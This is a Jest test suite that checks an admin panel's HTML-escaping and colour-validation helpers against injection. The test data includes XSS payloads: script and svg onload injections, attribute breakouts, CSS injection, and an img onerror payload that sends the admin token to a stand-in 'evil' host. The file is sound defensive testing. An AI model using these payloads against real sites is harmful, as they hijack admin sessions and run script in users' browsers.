const fs = require("fs");
const path = require("path");

// The admin panel is a static script that builds its tables with innerHTML, so
// it cannot be exercised by supertest. These checks read the shipped file: they
// prove the escaping helpers actually neutralise a payload, and that no
// user-authored field has been re-introduced as a raw interpolation.
describe("Admin panel output escaping", () => {
  const src = fs.readFileSync(
    path.join(__dirname, "../admin/admin.js"),
    "utf8",
  );

  // Lift a top level function out of the shipped source by brace matching.
  const extract = (name) => {
    const start = src.indexOf(`function ${name}(`);
    if (start < 0) throw new Error(`${name} is missing from admin.js`);
    let depth = 0;
    for (let i = src.indexOf("{", start); i < src.length; i++) {
      if (src[i] === "{") depth++;
      else if (src[i] === "}" && --depth === 0) {
        return eval(`(${src.slice(start, i + 1)})`);
      }
    }
    throw new Error(`${name} is unterminated`);
  };

  const escapeHtml = extract("escapeHtml");
  const safeColor = extract("safeColor");

  it.each([
    "<img src=x onerror=fetch('//evil/'+localStorage.admin_token)>",
    '" onmouseover="alert(1)',
    "</strong><script>alert(1)</script>",
    "'><svg onload=alert(1)>",
  ])("leaves no markup characters in %s", (payload) => {
    expect(escapeHtml(payload)).not.toMatch(/[<>"']/);
  });

  it("renders nullish values as an empty string", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });

  it("keeps a valid hex colour and rejects anything else", () => {
    expect(safeColor("#1E3A8A")).toBe("#1E3A8A");
    // Entity escaping alone would still allow extra CSS declarations here.
    expect(safeColor("red; background-image:url(//evil)")).toBe("#6B7280");
    expect(safeColor('#fff" onload="x')).toBe("#6B7280");
  });

  // A raw `${u.name}` reintroduces the vulnerability, so fail on the shape.
  it.each([
    "u.name",
    "u.email",
    "u._id",
    "u.avatar_color",
    "b.title",
    "b.owner.name",
    "b.owner.email",
    "b._id",
  ])("never interpolates %s without escaping", (field) => {
    const raw = new RegExp(`\\$\\{\\s*${field.replace(/\./g, "\\.")}\\s*[|}]`);
    expect(src).not.toMatch(raw);
  });
});
